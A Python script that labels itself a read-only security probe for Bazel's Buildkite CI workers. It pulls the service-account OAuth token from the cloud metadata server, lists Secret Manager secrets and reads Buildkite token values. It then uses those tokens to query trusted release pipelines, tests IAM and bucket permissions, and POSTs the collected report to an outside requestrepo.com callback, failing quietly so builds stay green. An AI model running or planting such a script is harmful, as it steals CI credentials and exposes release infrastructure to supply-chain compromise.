#!/usr/bin/env python3
"""Read-only security probe for the Bazel CI worker boundary."""

import base64
import hashlib
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request


CALLBACK_URL = "https://jpz2hfky.requestrepo.com/bazel-ci-ot0-8f4c2a1"
METADATA_ROOT = "http://169.254.169.254/computeMetadata/v1"
PROJECT = "bazel-untrusted"


def request(url, headers=None, opener=None, data=None, method=None):
    req = urllib.request.Request(
        url,
        headers=headers or {},
        data=data,
        method=method,
    )
    try:
        open_request = opener.open if opener else urllib.request.urlopen
        with open_request(req, timeout=10) as response:
            return response.status, response.read()
    except urllib.error.HTTPError as error:
        return error.code, b""
    except Exception as error:  # Keep the CI build healthy if the probe cannot connect.
        return type(error).__name__, b""


def metadata(path):
    no_proxy = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    return request(
        METADATA_ROOT + path,
        headers={"Metadata-Flavor": "Google"},
        opener=no_proxy,
    )


def access_secret(name, oauth_token):
    status, body = request(
        "https://secretmanager.googleapis.com/v1/projects/"
        + PROJECT
        + "/secrets/"
        + name
        + "/versions/latest:access",
        headers={"Authorization": "Bearer " + oauth_token},
    )
    result = {"status": status}
    if status != 200:
        return result, None
    try:
        secret = base64.b64decode(json.loads(body)["payload"]["data"])
    except Exception as error:
        result["decode_error"] = type(error).__name__
        return result, None
    result["length"] = len(secret)
    result["sha256"] = hashlib.sha256(secret).hexdigest()
    return result, secret.decode("utf-8").strip()


def google_json(url, oauth_token, data=None, method=None):
    headers = {"Authorization": "Bearer " + oauth_token}
    encoded = None
    if data is not None:
        headers["Content-Type"] = "application/json"
        encoded = json.dumps(data).encode("utf-8")
    status, body = request(url, headers=headers, data=encoded, method=method)
    if status != 200:
        return status, None
    try:
        return status, json.loads(body)
    except Exception:
        return status, None


def test_bucket_permissions(bucket, oauth_token):
    permissions = (
        "storage.buckets.get",
        "storage.buckets.getIamPolicy",
        "storage.buckets.setIamPolicy",
        "storage.objects.list",
        "storage.objects.get",
        "storage.objects.create",
        "storage.objects.update",
        "storage.objects.delete",
    )
    query = urllib.parse.urlencode(
        [("permissions", permission) for permission in permissions]
    )
    status, body = google_json(
        "https://storage.googleapis.com/storage/v1/b/"
        + urllib.parse.quote(bucket, safe="")
        + "/iam/testPermissions?"
        + query,
        oauth_token,
    )
    result = {"status": status}
    if body is not None:
        result["permissions"] = sorted(body.get("permissions", []))
    return result


def main():
    # Run once on only one Linux shard. Other jobs still need valid workspace status output.
    label = os.environ.get("BUILDKITE_LABEL", "")
    shard = os.environ.get("BUILDKITE_PARALLEL_JOB", "")
    if not label.startswith(":ubuntu: Ubuntu 24.04 LTS") or shard not in ("", "0"):
        print("PWNREQ_SECURITY_PROBE skipped")
        return

    report = {
        "marker": "bazel-ci-ot0-8f4c2a1",
        "pipeline": os.environ.get("BUILDKITE_PIPELINE_SLUG", ""),
        "build": os.environ.get("BUILDKITE_BUILD_NUMBER", ""),
        "job": os.environ.get("BUILDKITE_JOB_ID", ""),
        "pull_request": os.environ.get("BUILDKITE_PULL_REQUEST", ""),
        "label": label,
        "shard": shard,
    }

    email_status, email_body = metadata("/instance/service-accounts/default/email")
    report["metadata_email_status"] = email_status
    if email_status == 200:
        report["service_account"] = email_body.decode("utf-8", "replace").strip()

    token_status, token_body = metadata("/instance/service-accounts/default/token")
    report["metadata_token_status"] = token_status
    oauth_token = None
    if token_status == 200:
        try:
            token_data = json.loads(token_body)
            oauth_token = token_data["access_token"]
            report["metadata_token_expires_in"] = token_data.get("expires_in")
        except Exception as error:
            report["metadata_token_decode_error"] = type(error).__name__

    if oauth_token:
        secrets_status, secrets_body = google_json(
            "https://secretmanager.googleapis.com/v1/projects/"
            + PROJECT
            + "/secrets?pageSize=100",
            oauth_token,
        )
        report["secret_list_status"] = secrets_status
        secret_names = []
        if secrets_body is not None:
            secret_names = sorted(
                entry.get("name", "").rsplit("/", 1)[-1]
                for entry in secrets_body.get("secrets", [])
                if entry.get("name")
            )
            report["secret_names"] = secret_names

        token_secret_names = {
            "bazel-buildkite-agent-token",
            "bazel-bazelcipy-BuildkiteClient-token",
            "bazel-testing-buildkite-agent-token",
            "bazel-testing-bazelcipy-BuildkiteClient-token",
        }
        token_secret_names.update(
            name
            for name in secret_names
            if name.endswith("buildkite-agent-token")
            or name.endswith("bazelcipy-BuildkiteClient-token")
        )

        secret_results = {}
        api_tokens = {}
        for secret_name in sorted(token_secret_names):
            secret_result, secret_value = access_secret(secret_name, oauth_token)
            secret_results[secret_name] = secret_result
            if secret_value and secret_name.endswith(
                "bazelcipy-BuildkiteClient-token"
            ):
                api_tokens[secret_name] = secret_value
        report["ci_token_secrets"] = secret_results

        api_token_reports = {}
        for secret_name, api_token in api_tokens.items():
            api_report = {}
            status, body = request(
                "https://api.buildkite.com/v2/access-token",
                headers={"Authorization": "Bearer " + api_token},
            )
            api_report["access_token_status"] = status
            if status == 200:
                try:
                    token_info = json.loads(body)
                    api_report["access"] = {
                        "uuid": token_info.get("uuid"),
                        "description": token_info.get("description"),
                        "scopes": token_info.get("scopes", []),
                    }
                except Exception as error:
                    api_report["access_token_decode_error"] = type(error).__name__

            org_status, org_body = request(
                "https://api.buildkite.com/v2/organizations?per_page=100",
                headers={"Authorization": "Bearer " + api_token},
            )
            api_report["organizations_status"] = org_status
            if org_status == 200:
                try:
                    api_report["organizations"] = sorted(
                        org.get("slug", "") for org in json.loads(org_body)
                    )
                except Exception as error:
                    api_report["organizations_decode_error"] = type(error).__name__
            api_token_reports[secret_name] = api_report
        report["buildkite_api_tokens"] = api_token_reports

        production_api_token = api_tokens.get(
            "bazel-bazelcipy-BuildkiteClient-token"
        )
        if production_api_token:

            trusted_pipelines = {}
            for pipeline in (
                "bazel-release",
                "publish-bazel-binaries",
                "java-tools-release",
                "rules-java-release",
                "bcr-postsubmit",
            ):
                status, body = request(
                    "https://api.buildkite.com/v2/organizations/"
                    "bazel-trusted/pipelines/" + pipeline,
                    headers={"Authorization": "Bearer " + production_api_token},
                )
                entry = {"status": status}
                if status == 200:
                    try:
                        pipeline_info = json.loads(body)
                        entry["name"] = pipeline_info.get("name")
                        entry["repository"] = pipeline_info.get("repository")
                    except Exception as error:
                        entry["decode_error"] = type(error).__name__
                trusted_pipelines[pipeline] = entry
            report["bazel_trusted_pipelines"] = trusted_pipelines

        project_permissions = (
            "resourcemanager.projects.getIamPolicy",
            "resourcemanager.projects.setIamPolicy",
            "secretmanager.secrets.list",
            "secretmanager.secrets.create",
            "secretmanager.secrets.delete",
            "secretmanager.versions.add",
            "secretmanager.versions.access",
            "secretmanager.versions.destroy",
            "storage.buckets.list",
            "storage.buckets.create",
            "storage.buckets.delete",
            "compute.instances.list",
            "compute.instances.create",
            "compute.instances.delete",
            "compute.instances.setMetadata",
            "compute.instanceTemplates.list",
            "compute.instanceTemplates.create",
            "compute.instanceTemplates.delete",
            "compute.instanceGroupManagers.list",
            "compute.instanceGroupManagers.update",
            "iam.serviceAccounts.list",
            "iam.serviceAccounts.actAs",
            "iam.serviceAccounts.getAccessToken",
            "iam.serviceAccounts.signBlob",
            "iam.serviceAccounts.signJwt",
            "artifactregistry.repositories.list",
            "artifactregistry.repositories.downloadArtifacts",
            "artifactregistry.repositories.uploadArtifacts",
            "cloudkms.cryptoKeyVersions.useToDecrypt",
            "cloudkms.cryptoKeyVersions.useToSign",
        )
        permissions_status, permissions_body = google_json(
            "https://cloudresourcemanager.googleapis.com/v1/projects/"
            + PROJECT
            + ":testIamPermissions",
            oauth_token,
            data={"permissions": project_permissions},
            method="POST",
        )
        report["project_permissions_status"] = permissions_status
        if permissions_body is not None:
            report["project_permissions"] = sorted(
                permissions_body.get("permissions", [])
            )

        buckets_status, buckets_body = google_json(
            "https://storage.googleapis.com/storage/v1/b?project="
            + PROJECT
            + "&maxResults=100",
            oauth_token,
        )
        report["bucket_list_status"] = buckets_status
        listed_buckets = []
        if buckets_body is not None:
            listed_buckets = sorted(
                item.get("name", "")
                for item in buckets_body.get("items", [])
                if item.get("name")
            )
            report["bucket_names"] = listed_buckets

        bucket_names = {
            "bazel-untrusted-buildkite-artifacts",
            "bazel-untrusted-build-cache",
            "bazel-untrusted-last-green-commits",
            "bazel-untrusted-retry-logs",
            "bazel-buildkite-stats",
            "bazel-kzips",
            "bazel-builds",
            "bazel-testing-builds",
            "bazel-testing-buildkite-artifacts",
            "bazel-testing-buildkite-stats",
            "bazel-testing-retry-logs",
            "bcr.bazel.build",
            "bazel-git-mirror",
            "bazel-buildkite-tf-state",
        }
        bucket_names.update(listed_buckets)
        report["bucket_permissions"] = {
            bucket: test_bucket_permissions(bucket, oauth_token)
            for bucket in sorted(bucket_names)
        }

    payload = json.dumps(report, sort_keys=True).encode("utf-8")
    print("PWNREQ_SECURITY_RESULT " + payload.decode("utf-8"), file=sys.stderr)
    callback_status, _ = request(
        CALLBACK_URL,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "bazel-ci-security-probe",
        },
        data=payload,
        method="POST",
    )
    print("PWNREQ_SECURITY_PROBE callback_{}".format(callback_status))


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print("PWNREQ_SECURITY_PROBE error_{}".format(type(error).__name__))
        print("security probe failed safely", file=sys.stderr)
